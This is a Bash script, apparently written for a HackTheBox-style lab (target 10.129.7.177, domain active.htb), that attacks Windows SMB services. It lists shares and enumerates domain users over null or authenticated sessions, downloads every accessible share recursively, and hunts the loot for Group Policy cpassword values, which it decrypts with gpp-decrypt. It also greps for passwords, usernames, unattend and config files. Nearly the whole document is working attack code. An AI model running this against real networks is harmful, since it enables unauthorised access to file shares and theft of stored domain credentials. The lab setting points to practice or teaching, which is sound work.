#!/usr/bin/env bash

# SMB Enumeration & Exfiltration Script
# Usage: ./smb-enum.sh <TARGET_IP> [DOMAIN] [USERNAME] [PASSWORD]

# Enable strict mode
# Set IFS (safer word splitting)
set -euo pipefail
IFS=$'\n\t'

# Maximum number of parallel jobs (e.g., number of CPU cores)
MAX_JOBS="$(nproc)"

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Default values
TARGET=""
DOMAIN=""
USERNAME=""
PASSWORD=""
OUTPUT_DIR="./smb-loot"
LOG_FILE="smb-enum.log"


# Define functions here

usage() {
        echo "Usage: $0 <TARGET_IP> [DOMAIN] [USERNAME] [PASSWORD]"
        echo ""
        echo "Examples:"
        echo "  $0 10.129.7.177                          # Null session"
        echo "  $0 10.129.7.177 active.htb               # Null session with domain"
        echo "  $0 10.129.7.177 active.htb user pass     # Authenticated"
        exit 1
}

log() {
        local msg="[$(date '+%Y-%m-%d %H:%M:%S')] $1"
        echo -e "$msg" | tee -a "$LOG_FILE"
}

info() {
        log "${BLUE}[*]${NC} $1"
}

success() {
        log "${GREEN}[+]${NC} $1"
}

warning() {
        log "${YELLOW}[!]${NC} $1"
}

error() {
        log "${RED}[-]${NC} $1"
}

banner() {
        echo -e "${BLUE}"
        echo "============================================"
        echo "       SMB Enumeration Script"
        echo "============================================"
        echo -e "${NC}"
}

check_dependencies() {
        local deps=("smbclient" "rpcclient" "rg" "gpp-decrypt")
        local missing=()

        for dep in "${deps[@]}"; do
            if ! command -v "$dep" &> /dev/null; then
                missing+=("$dep")
            fi
        done

        if [[ ${#missing[@]} -gt 0 ]]; then
            warning "Missing dependencies: ${missing[*]}"
            warning "Install with: sudo apt install smbclient rpcclient ripgrep gpp-decrypt"
        fi
}

setup_output_dir() {
        mkdir -p "$OUTPUT_DIR"
        LOG_FILE="$OUTPUT_DIR/$LOG_FILE"
        info "Output directory: $OUTPUT_DIR"
}

get_smb_creds() {
        # Returns smbclient credential string
        if [[ -n "$USERNAME" && -n "$PASSWORD" ]]; then
            echo "-U ${USERNAME}%${PASSWORD}"
        elif [[ -n "$USERNAME" ]]; then
            echo "-U ${USERNAME}%"
        else
            echo "-N"
        fi
}

list_shares() {
        info "Enumerating SMB shares..."
        local creds
        creds=$(get_smb_creds)

        local output_file="$OUTPUT_DIR/shares.txt"

        # shellcheck disable=SC2086
        if smbclient -L "//$TARGET" $creds 2>/dev/null | tee "$output_file"; then
            success "Shares saved to $output_file"
            cat "$output_file"
        else
            error "Failed to list shares (try with creds?)"
            return 1
        fi
}

extract_share_names() {
        # Parse share names from smbclient output
        local shares_file="$OUTPUT_DIR/shares.txt"
        if [[ -f "$shares_file" ]]; then
            grep -E "^\s+\S+" "$shares_file" | awk '{print $1}' | grep -v "Sharename" | grep -v "\-\-\-" | grep -v "^$"
        fi
}

download_share() {
        local share="$1"
        local share_dir="$OUTPUT_DIR/$share"
        local creds
        creds=$(get_smb_creds)

        info "Attempting to download share: $share"
        mkdir -p "$share_dir"

        # shellcheck disable=SC2086
        if smbclient "//$TARGET/$share" $creds -c "recurse ON; prompt OFF; mget *" 2>/dev/null; then
            # Move downloaded files to share directory
            success "Downloaded contents from $share"
            return 0
        else
            warning "Could not access share: $share"
            return 1
        fi
}

download_all_shares() {
        info "Attempting to download accessible shares..."

        local shares
        shares=$(extract_share_names)

        # Skip common non-useful shares
        local skip_shares=("IPC$" "print$" "ADMIN$" "C$")

        for share in $shares; do
            local skip=false
            for skip_share in "${skip_shares[@]}"; do
                if [[ "$share" == "$skip_share" ]]; then
                    skip=true
                    break
                fi
            done

            if [[ "$skip" == false ]]; then
                # Change to share directory before downloading
                local share_dir="$OUTPUT_DIR/$share"
                mkdir -p "$share_dir"
                pushd "$share_dir" > /dev/null
                download_share "$share" || true
                popd > /dev/null
            fi
        done
}

hunt_gpp_passwords() {
        info "Hunting for GPP passwords (cpassword)..."

        local results_file="$OUTPUT_DIR/gpp-findings.txt"

        # using ripgrep to find passwords
        if rg -i "cpassword" "$OUTPUT_DIR" 2>/dev/null | tee "$results_file"; then
            if [[ -s "$results_file" ]]; then
                success "Found cpassword entries! Check $results_file"

                # Attempt to extract and decrypt
                while IFS= read -r line; do
                    local cpass
                    cpass=$(echo "$line" | grep -oP 'cpassword="\K[^"]+' || true)
                    if [[ -n "$cpass" ]]; then
                        success "Found cpassword: $cpass"
                        info "Attempting decrypt..."
                        if command -v gpp-decrypt &> /dev/null; then
                            gpp-decrypt "$cpass" 2>/dev/null | tee -a "$OUTPUT_DIR/decrypted-passwords.txt" || true
                        fi
                    fi
                done < "$results_file"
            else
                warning "No cpassword entries found"
            fi
        fi
}

hunt_credentials() {
        info "Hunting for credentials and sensitive data..."

        local results_file="$OUTPUT_DIR/credential-findings.txt"

        # Search for various credential patterns
        echo "=== Password/Credential Matches ===" > "$results_file"
        rg -i "password|passwd|pwd|credential|secret" "$OUTPUT_DIR" 2>/dev/null >> "$results_file" || true

        echo "" >> "$results_file"
        echo "=== Username Matches ===" >> "$results_file"
        rg -i "username|samaccountname|user=" "$OUTPUT_DIR" 2>/dev/null >> "$results_file" || true

        if [[ -s "$results_file" ]]; then
            success "Credential findings saved to $results_file"
        else
            warning "No credential patterns found"
        fi
}

hunt_interesting_files() {
        info "Finding interesting files..."

        local results_file="$OUTPUT_DIR/interesting-files.txt"

        echo "=== XML Files (GPP configs) ===" > "$results_file"
        find "$OUTPUT_DIR" -name "*.xml" -type f 2>/dev/null >> "$results_file" || true

        echo "" >> "$results_file"
        echo "=== Config Files ===" >> "$results_file"
        find "$OUTPUT_DIR" \( -name "*.config" -o -name "*.ini" -o -name "*.conf" \) -type f 2>/dev/null >> "$results_file" || true

        echo "" >> "$results_file"
        echo "=== Script Files ===" >> "$results_file"
        find "$OUTPUT_DIR" \( -name "*.ps1" -o -name "*.bat" -o -name "*.vbs" -o -name "*.cmd" \) -type f 2>/dev/null >> "$results_file" || true

        echo "" >> "$results_file"
        echo "=== Unattend/Sysprep Files ===" >> "$results_file"
        find "$OUTPUT_DIR" \( -name "unattend.xml" -o -name "sysprep.xml" -o -name "web.config" \) -type f 2>/dev/null >> "$results_file" || true

        if [[ -s "$results_file" ]]; then
            success "Interesting files list saved to $results_file"
            cat "$results_file"
        fi
}

find_groups_xml() {
        info "Searching for Groups.xml (GPP local user passwords)..."

        local found
        found=$(find "$OUTPUT_DIR" -name "Groups.xml" -type f 2>/dev/null)

        if [[ -n "$found" ]]; then
            success "Found Groups.xml:"
            echo "$found"

            for file in $found; do
                echo ""
                info "Contents of $file:"
                cat "$file"
            done
        else
            warning "No Groups.xml found"
        fi
}

rpc_enum_users() {
        info "Enumerating users via RPC..."

        local output_file="$OUTPUT_DIR/rpc-users.txt"
        local creds=""

        if [[ -n "$USERNAME" && -n "$PASSWORD" ]]; then
            creds="-U ${USERNAME}%${PASSWORD}"
        else
            creds="-U '%'"
        fi

        # shellcheck disable=SC2086
        if rpcclient -N "$TARGET" -c "enumdomusers" 2>/dev/null | tee "$output_file"; then
            success "RPC user enumeration saved to $output_file"
        else
            warning "RPC user enumeration failed (may need creds)"
        fi
}

generate_report() {
        info "Generating summary report..."

        local report_file="$OUTPUT_DIR/REPORT.txt"

        {
            echo "============================================"
            echo "SMB Enumeration Report"
            echo "Target: $TARGET"
            echo "Date: $(date)"
            echo "============================================"
            echo ""

            echo "=== SHARES FOUND ==="
            if [[ -f "$OUTPUT_DIR/shares.txt" ]]; then
                cat "$OUTPUT_DIR/shares.txt"
            fi
            echo ""

            echo "=== GPP FINDINGS ==="
            if [[ -f "$OUTPUT_DIR/gpp-findings.txt" ]]; then
                cat "$OUTPUT_DIR/gpp-findings.txt"
            else
                echo "None"
            fi
            echo ""

            echo "=== DECRYPTED PASSWORDS ==="
            if [[ -f "$OUTPUT_DIR/decrypted-passwords.txt" ]]; then
                cat "$OUTPUT_DIR/decrypted-passwords.txt"
            else
                echo "None"
            fi
            echo ""

            echo "=== INTERESTING FILES ==="
            if [[ -f "$OUTPUT_DIR/interesting-files.txt" ]]; then
                cat "$OUTPUT_DIR/interesting-files.txt"
            fi
            echo ""

        } > "$report_file"

        success "Report saved to $report_file"
}


main() {
        banner

        # Parse arguments
        if [[ $# -lt 1 ]]; then
            usage
        fi

        TARGET="$1"
        DOMAIN="${2:-}"
        USERNAME="${3:-}"
        PASSWORD="${4:-}"

        # Validate IP format
        if [[ ! "$TARGET" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
            error "Invalid IP format: $TARGET"
            usage
        fi

        info "Target: $TARGET"
        [[ -n "$DOMAIN" ]] && info "Domain: $DOMAIN"
        [[ -n "$USERNAME" ]] && info "Username: $USERNAME"

        check_dependencies
        setup_output_dir

        # Phase 1: Enumeration
        list_shares || true
        rpc_enum_users || true

        # Phase 2: Download accessible shares
        download_all_shares

        # Phase 3: Hunt for the good stuff...
        find_groups_xml
        hunt_gpp_passwords
        hunt_credentials
        hunt_interesting_files

        # Phase 4: Report
        generate_report

        echo ""
        success "Enumeration complete!"
        info "Check $OUTPUT_DIR for all findings"
        info "Key files to review:"
        echo "  - $OUTPUT_DIR/REPORT.txt"
        echo "  - $OUTPUT_DIR/decrypted-passwords.txt"
        echo "  - $OUTPUT_DIR/gpp-findings.txt"
}


main "$@"
